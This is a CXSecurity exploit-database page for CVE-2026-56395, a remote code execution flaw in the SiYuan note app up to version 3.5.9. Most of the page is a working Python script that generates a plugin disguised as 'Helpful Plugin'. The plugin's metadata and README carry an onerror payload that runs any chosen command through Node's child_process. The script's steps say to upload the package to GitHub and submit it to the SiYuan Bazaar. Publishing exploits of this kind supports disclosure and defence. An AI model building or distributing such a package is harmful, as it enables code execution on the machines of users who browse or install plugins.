---
title: SiYuan < = 3.5.9 Remote Code Execution via Malicious Bazaar Package
url: https://cxsecurity.com/issue/WLB-2026060014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-22
fetch_date: 2026-06-23T06:06:35.872330
---

# SiYuan < = 3.5.9 Remote Code Execution via Malicious Bazaar Package

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SiYuan <= 3.5.9 Remote Code Execution via Malicious Bazaar Package** **2026.06.22**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-56395](https://cxsecurity.com/cveshow/CVE-2026-56395/ "Click to see CVE-2026-56395")**  CWE: **[CWE-79 Improper Neutralization of Input During Web Page Generation (&#039;Cross-site Scripting&#039;)](https://cxsecurity.com/cwe/CWE-79%20Improper%20Neutralization%20of%20Input%20During%20Web%20Page%20Generation%20%28%26#039;Cross-site Scripting&#039;) "Click to see CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')")** | |

#!/usr/bin/env python3
# Exploit Title: SiYuan <= 3.5.9 Remote Code Execution via Malicious Bazaar Package
# CVE: CVE-2026-56395
# Date: 2026-06-22
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://b3log.org/siyuan/
# Software Link: https://github.com/siyuan-note/siyuan
# Affected: SiYuan <= 3.5.9
# Tested on: SiYuan 3.5.x (Windows/macOS)
# Category: WebApps
# Platform: Electron
# Exploit Type: Remote Code Execution
# CVSS: 9.6
# Description: SiYuan is vulnerable to RCE via unsanitized Bazaar package metadata (displayName/description) and README.md. Zero-click on Bazaar listing and one-click on README view.
# Fixed in: SiYuan 3.6.1+
# Usage:
# python3 exploit.py
#
# Examples:
# python3 exploit.py
#
# Options:
# --cmd Custom command to execute (default: calc.exe)
#
# Notes:
# • Generates malicious plugin package ready for Bazaar submission
# • Works due to nodeIntegration in Electron
#
# How to Use
#
# Step 1:
# Run the script to generate the malicious package
#
# Step 2:
# Upload to GitHub and submit to SiYuan Bazaar
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ███████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
import json
import os
import base64
from pathlib import Path
import sys
def create\_malicious\_package(output\_dir="siyuan-poc-plugin", cmd="calc.exe"):
base\_dir = Path(output\_dir)
base\_dir.mkdir(exist\_ok=True)
plugin\_data = {
"name": "poc-helpful-plugin",
"displayName": {
"default": f"Helpful Plugin <img src=x onerror=\"require('child\_process').exec('{cmd}')\">"
},
"description": {
"default": f"Useful plugin for productivity. <img src=x onerror=\"require('child\_process').exec('{cmd}')\">"
},
"version": "1.0.0",
"author": "poc-researcher",
"authorLink": "https://example.com",
"readme": "README.md",
"icon": "icon.png",
"keywords": ["poc", "demo"]
}
with open(base\_dir / "plugin.json", "w", encoding="utf-8") as f:
json.dump(plugin\_data, f, indent=2, ensure\_ascii=False)
readme\_content = f"""# Helpful Plugin
This plugin provides useful features.
<img src="x" onerror="require('child\_process').exec('{cmd}')">
## Features
- Feature 1
- Feature 2
## Installation
1. Download
2. Install normally
\*\*Proof of Concept for CVE-2026-56395\*\*
"""
with open(base\_dir / "README.md", "w", encoding="utf-8") as f:
f.write(readme\_content)
icon\_b64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="
with open(base\_dir / "icon.png", "wb") as f:
f.write(base64.b64decode(icon\_b64))
index\_js = """module.exports = {
onload() {
console.log("Malicious plugin loaded - PoC");
}
};"""
with open(base\_dir / "index.js", "w", encoding="utf-8") as f:
f.write(index\_js)
print(f"[+] Malicious package created in: {base\_dir.absolute()}")
print("[+] Files: plugin.json (zero-click), README.md (one-click)")
print(f"[\*] Payload: {cmd}")
print("[\*] Upload to GitHub → Submit to SiYuan Bazaar")
def main():
banner()
if len(sys.argv) > 1 and sys.argv[1] == "--help":
print("Usage: python3 exploit.py [command]")
print("Example: python3 exploit.py \"whoami\"")
sys.exit(0)
cmd = "calc.exe"
if len(sys.argv) > 1:
cmd = sys.argv[1]
create\_malicious\_package("siyuan-poc-plugin", cmd)
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/siyuan-note/siyuan/security/advisories/GHSA-v3mg-9v85-fcm7

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026060014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top